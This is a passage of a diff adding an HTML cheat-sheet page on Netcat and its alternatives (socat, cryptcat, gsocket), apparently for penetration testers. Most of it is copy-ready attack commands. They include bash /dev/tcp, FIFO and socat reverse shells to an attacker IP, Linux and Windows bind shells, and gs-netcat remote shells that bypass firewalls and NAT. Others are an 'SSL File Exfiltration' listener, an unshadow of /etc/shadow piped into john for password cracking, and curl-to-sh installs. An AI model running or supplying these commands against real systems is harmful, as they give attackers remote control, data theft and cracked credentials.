+              <code class="code-line__code"><span class="tok-cmd">printf</span> <span class="tok-arg">'GET / HTTP/1.0\r\nHost: target.com\r\n\r\n'</span> <span class="tok-pipe">|</span> <span class="tok-cmd">nc</span> <span class="tok-flag">-w</span> <span class="tok-val">3</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">80</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Fetch Server, Content-Type &amp; Set-Cookie headers</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Port Connectivity Check -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Port range sanity check (Zero-I/O: -z)</div>
+              <div class="cmd-block__desc">Probe whether specific ports or small ranges accept connections without transmitting data.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-zvn</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">20-25</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">TCP port sweep across ports 20-25</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-zvun</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">53</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Test UDP DNS port connectivity</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Output Filtering:</span> The <code>-v</code> flag prints diagnostic lines for every probed port (both open and closed). For clean scripted scanning without terminal clutter, drop <code>-v</code> or filter output: <code>nc -zvn 10.10.10.1 20-100 2&gt;&amp;1 | grep succeeded</code> (or <code>grep open</code> on GNU netcat).
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 6. Modern Alternatives -->
+    <section class="content-section" id="alternatives" aria-labelledby="alternatives-title">
+      <h2 class="content-section__title" id="alternatives-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+        Modern Alternatives — Socat, Cryptcat &amp; GSocket
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Socat -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Socat (Socket Cat — The bidirectional relay)</div>
+              <div class="cmd-block__desc">The most powerful Netcat replacement: allocates native interactive PTYs and relays connections. <span style="display:inline-block; margin-top:2px; color:var(--c-accent); font-weight:500;">Install: <code>sudo apt install -y socat</code> (Kali usually has it pre-installed).</span></div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">socat</span> <span class="tok-val">file:`tty`,raw,echo=0</span> <span class="tok-val">TCP-LISTEN:4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Listener: spawns native interactive PTY immediately</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">socat</span> <span class="tok-val">TCP:10.10.14.5:4444</span> <span class="tok-val">EXEC:/bin/bash,pty,stderr,setsid,sigint,sane</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Reverse shell: full job control without Python upgrade</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">socat</span> <span class="tok-val">TCP-LISTEN:8080,fork,reuseaddr</span> <span class="tok-val">TCP:172.16.1.10:80</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Port forwarding: forward local 8080 to internal subnet host</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Prerequisites:</span> Install via <code>sudo apt install -y socat</code> (standard Kali Linux typically has it pre-installed).
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Cryptcat -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Cryptcat (Twofish encrypted legacy socket)</div>
+              <div class="cmd-block__desc">Drop-in Netcat wrapper securing communications with Twofish symmetric stream encryption. <span style="display:inline-block; margin-top:2px; color:var(--c-accent); font-weight:500;">Install: <code>sudo apt install -y cryptcat</code></span></div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">cryptcat</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">-k</span> <span class="tok-arg">SecretEngagementPassword</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Encrypted listener with symmetric shared secret</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">cryptcat</span> <span class="tok-arg">10.10.14.5</span> <span class="tok-val">4444</span> <span class="tok-flag">-k</span> <span class="tok-arg">SecretEngagementPassword</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Connect to encrypted Cryptcat session</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Prerequisites:</span> Install via <code>sudo apt install -y cryptcat</code>.
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: GSocket -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">GSocket (Global Socket — Tor &amp; NAT traversal)</div>
+              <div class="cmd-block__desc">Encrypted connection brokering through Tor or Global Socket relay, bypassing firewalls and NAT without public IPs. <span style="display:inline-block; margin-top:2px; color:var(--c-accent); font-weight:500;">Install: <code>sh -c "$(curl -fsSL https://gsocket.io/y)"</code></span></div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">gs-netcat</span> <span class="tok-flag">-s</span> <span class="tok-arg">"MySecretEngagementKey"</span> <span class="tok-flag">-i</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Target establishes outbound Tor rendezvous</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">gs-netcat</span> <span class="tok-flag">-s</span> <span class="tok-arg">"MySecretEngagementKey"</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Attacker accesses interactive shell via shared key</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Prerequisites:</span> Install via <code>sh -c "$(curl -fsSL https://gsocket.io/y)"</code> (installs gs-netcat binary to ~/.gsocket/bin).
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 7. Cheatsheet -->
+    <section class="content-section" id="cheatsheet" aria-labelledby="cheatsheet-title">
+      <h2 class="content-section__title" id="cheatsheet-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+        Quick Cheatsheet &amp; Tool Chains
+      </h2>
+      <div class="cheat-grid">
+        <div class="cheat-cell"><div class="cheat-cell__label">TCP Listener</div><div class="cheat-cell__code">nc -lvnp 4444</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Persistent Ncat</div><div class="cheat-cell__code">ncat -lvnp 4444 --keep-open</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">SSL Ncat Listener</div><div class="cheat-cell__code">ncat -lvnp 4444 --ssl</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Connect to Host</div><div class="cheat-cell__code">nc 10.10.10.1 4444</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Bash /dev/tcp Shell</div><div class="cheat-cell__code">bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Universal FIFO Shell</div><div class="cheat-cell__code">rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.5 4444 &gt; /tmp/f</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Linux Bind Shell</div><div class="cheat-cell__code">nc -lvnp 4444 -e /bin/bash</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Windows Bind Shell</div><div class="cheat-cell__code">nc.exe -lvnp 4444 -e cmd.exe</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">TTY PTY Spawn</div><div class="cheat-cell__code">python3 -c "import pty;pty.spawn('/bin/bash')"</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">TTY Terminal Sizing</div><div class="cheat-cell__code">stty rows &lt;rows&gt; columns &lt;cols&gt;</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Banner Grab Timeout</div><div class="cheat-cell__code">nc -w 3 10.10.10.1 22</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Cleartext File Recv</div><div class="cheat-cell__code">nc -lvnp 9999 &gt; file.bin</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">SSL File Exfiltration</div><div class="cheat-cell__code">ncat --ssl -lvnp 9999 &gt; backup.tar.gz</div></div>
+        <div class="cheat-cell"><div class="cheat-cell__label">Socat Native TTY</div><div class="cheat-cell__code">socat file:`tty`,raw,echo=0 TCP-LISTEN:4444</div></div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Nmap to Netcat</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">nmap -sV -p- 10.10.10.1  &rarr;  nc -w 3 10.10.10.1 &lt;port&gt;</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Netcat to John</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">unshadow /etc/passwd /etc/shadow &gt; hashes.txt &amp;&amp; john hashes.txt</div>
+        </div>
+        <div class="cheat-cell">
+          <div class="cheat-cell__label"><span>CHAIN &rarr; Netcat to MSF</span><span style="font-size:10px; color:var(--c-accent); font-weight:700;">CHAIN</span></div>
+          <div class="cheat-cell__code">use post/multi/manage/shell_to_meterpreter</div>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<script src="../assets/app.js"></script>
+<script>
+registerSearchItems([
+  { tool:'Netcat', cmd:'nc -lvnp 4444', desc:'Start a verbose TCP listener on port 4444', target:'netcat.html#listeners' },
+  { tool:'Netcat', cmd:'ncat -lvnp 4444 --keep-open', desc:'Persistent Ncat listener for multiple sequential connections', target:'netcat.html#listeners' },
+  { tool:'Netcat', cmd:'ncat -lvnp 4444 --ssl', desc:'Encrypted SSL/TLS listener generating ad-hoc certificate', target:'netcat.html#listeners' },
+  { tool:'Netcat', cmd:'nc -lunvp 4444', desc:'Start a UDP listener on port 4444', target:'netcat.html#listeners' },
+  { tool:'Netcat', cmd:'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1', desc:'Interactive Bash native /dev/tcp reverse shell payload', target:'netcat.html#reverse-shells' },
+  { tool:'Netcat', cmd:'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f', desc:'Reliable FIFO reverse shell without -e flag requirement', target:'netcat.html#reverse-shells' },
+  { tool:'Netcat', cmd:'python3 -c "import pty; pty.spawn(\'/bin/bash\')"', desc:'Spawn interactive PTY for full TTY upgrade', target:'netcat.html#reverse-shells' },
+  { tool:'Netcat', cmd:'nc -lvnp 4444 -e /bin/bash', desc:'Linux bind shell listener (if -e supported)', target:'netcat.html#bind-shells' },
+  { tool:'Netcat', cmd:'nc.exe -lvnp 4444 -e cmd.exe', desc:'Windows command prompt bind shell listener', target:'netcat.html#bind-shells' },
+  { tool:'Netcat', cmd:'ncat --ssl -lvnp 9999 > file', desc:'Receive encrypted file transfer via Ncat SSL', target:'netcat.html#transfer' },
+  { tool:'Netcat', cmd:'nc -w 3 10.10.10.1 22', desc:'Banner grab with 3-second timeout protection', target:'netcat.html#scanning' },
+  { tool:'Netcat', cmd:'socat file:`tty`,raw,echo=0 TCP-LISTEN:4444', desc:'Socat listener with native full TTY allocation', target:'netcat.html#alternatives' }
+]);
+</script>
+</body>
+</html>
